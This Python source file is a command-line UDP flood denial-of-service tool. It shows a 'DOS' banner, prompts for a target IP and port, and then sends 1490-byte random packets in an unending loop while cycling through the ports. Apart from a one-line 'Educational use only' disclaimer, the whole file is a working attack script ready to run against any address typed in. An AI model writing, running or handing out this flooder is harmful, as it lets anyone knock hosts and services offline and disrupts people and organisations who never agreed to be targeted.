import os
import sys
import time
import socket
import random
from colorama import Fore, init

init(autoreset=True)

DOS_BANNER = r"""
██████╗░░█████╗░░██████╗
██╔══██╗██╔══██╗██╔════╝
██║░░██║██║░░██║╚█████╗░
██║░░██║██║░░██║░╚═══██╗
██████╔╝╚█████╔╝██████╔╝
╚═════╝░░╚════╝░╚═════╝░

"""

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def start_dos(ip, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes_data = random._urandom(1490)
    sent = 0

    print(Fore.GREEN + f"\n[+] Starting DoS attack on {ip}:{port}...\n")
    time.sleep(2)

    try:
        while True:
            sock.sendto(bytes_data, (ip, port))
            sent += 1
            port = port + 1 if port < 65534 else 1
            print(Fore.MAGENTA + f"[+] Sent {sent} packet(s) to {ip} through port {port}")
    except KeyboardInterrupt:
        print(Fore.RED + "\n[!] Attack interrupted by user.")
        sys.exit(0)

def main():
    clear()
    print(Fore.CYAN + DOS_BANNER)
    print(Fore.YELLOW + "[!] Educational use only. DO NOT target unauthorized systems.\n")

    ip = input(Fore.YELLOW + "Enter target IP: ").strip()
    if not ip:
        print(Fore.RED + "No IP address provided.")
        return

    try:
        port = int(input(Fore.YELLOW + "Enter port: ").strip())
    except ValueError:
        print(Fore.RED + "Invalid port number.")
        return

    start_dos(ip, port)

if __name__ == "__main__":
    main()
